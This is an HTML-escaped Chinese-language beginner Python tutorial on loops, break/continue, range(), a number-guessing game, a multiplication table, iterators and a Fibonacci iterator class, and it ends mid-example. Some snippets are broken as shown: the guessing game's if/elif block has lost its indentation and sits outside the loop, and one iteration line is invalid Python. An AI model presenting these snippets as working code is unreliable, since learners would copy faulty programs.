&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;n&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  n=n+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  n=-n&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;for循环&lt;&#x2F;p&gt;
&lt;p&gt;语法 for X in Y&lt;&#x2F;p&gt;
&lt;p&gt;X是变量，Y是可迭代对象（可以是字符串、列表、元组、字典、函数等）&lt;&#x2F;p&gt;
&lt;p&gt;遍历字符串&lt;&#x2F;p&gt;
&lt;p&gt;for循环结合else语句&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;l=[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;l:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  l=x*x&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(l)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(x)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;当循环执行完之后则执行else语句&lt;&#x2F;p&gt;
&lt;p&gt;for循环结合range()&lt;&#x2F;p&gt;
&lt;p&gt;range()函数可以生成整数列表&lt;&#x2F;p&gt;
&lt;p&gt;range(x,y)会生成x到y-1的整数列表&lt;&#x2F;p&gt;
&lt;p&gt;range(start,end,step) step代表每次递增多少，默认是1&lt;&#x2F;p&gt;
&lt;p&gt;range的返回值不等于end，可以等于start&lt;&#x2F;p&gt;
&lt;p&gt;for x in range(1,10,2):&lt;&#x2F;p&gt;
&lt;p&gt;print (x)&lt;&#x2F;p&gt;
&lt;p&gt;循环控制&lt;&#x2F;p&gt;
&lt;p&gt;break：用于for循环或者while循环中，用来终止整个循环语句&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;n=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;n&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  n=n+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;n==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;continue：用于for循环或者while循环中，用来终止本次循环&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;n=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;n&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  n=n+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;n==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;continue&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(n)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;pass：用于循环语句、条件语句、函数语句中，主要作用是占空，保证语句的完整。&lt;&#x2F;p&gt;
&lt;p&gt;猜数字游戏&lt;&#x2F;p&gt;
&lt;p&gt;随机一个1-100的数字来猜，根据猜测的数字分别给一个提示（大了，小了或者猜对了），猜对之后返回猜测了几次&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;answer=random.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;counter=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	counter+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	number=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;请输入猜测的数字:&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;number&amp;gt;answer:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;猜大了&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;number&amp;lt;answer:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;猜小了&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;恭喜你猜对了&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;counter&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;你是傻子吗？&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;随机数是&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%answer)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;你总共猜了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;次&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;% counter)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;输出一个九九乘法表&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,i+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(i,j,i*j),&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;迭代器&lt;&#x2F;p&gt;
&lt;p&gt;迭代（Iteration）指的是对可迭代对象进行从头到尾遍历的过程，例如for循环的底层原理就是一个迭代&lt;&#x2F;p&gt;
&lt;p&gt;迭代器（iterator）指的是通过iter()函数返回的一个支持next()方法的对象&lt;&#x2F;p&gt;
&lt;p&gt;迭代方法&lt;&#x2F;p&gt;
&lt;p&gt;iter() 通过iter()可以获得可迭代对象，默认可迭代对象没有next()函数，通过iter()迭代函数赋予next()&lt;&#x2F;p&gt;
&lt;p&gt;next（）返回可迭代对象中的下一个元素，如果检查到StopIteration异常终止迭代&lt;&#x2F;p&gt;
&lt;p&gt;可迭代对象：列表、元组、字符串、字典、文件&lt;&#x2F;p&gt;
&lt;p&gt;迭代的原理？&lt;&#x2F;p&gt;
&lt;p&gt;可迭代对象在进行遍历的时候，自动调用iter()获取迭代器，自动调用next()方法获取下一个元素&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;l=[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] ----&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;iter&lt;&#x2F;span&gt;&lt;span&gt;(l)--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;next&lt;&#x2F;span&gt;&lt;span&gt;(l)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;手工迭代列表&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;l=[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;I=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;iter&lt;&#x2F;span&gt;&lt;span&gt;(l)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;I&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;next&lt;&#x2F;span&gt;&lt;span&gt;(I)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Fab&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;object&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;,):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.max=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.n,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.a,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.b=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__iter__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__next__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.n &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.max:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            out = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.b&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.a,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.b=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.b,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.a+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.b&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.n = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.n+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;StopIteration&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Fab&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
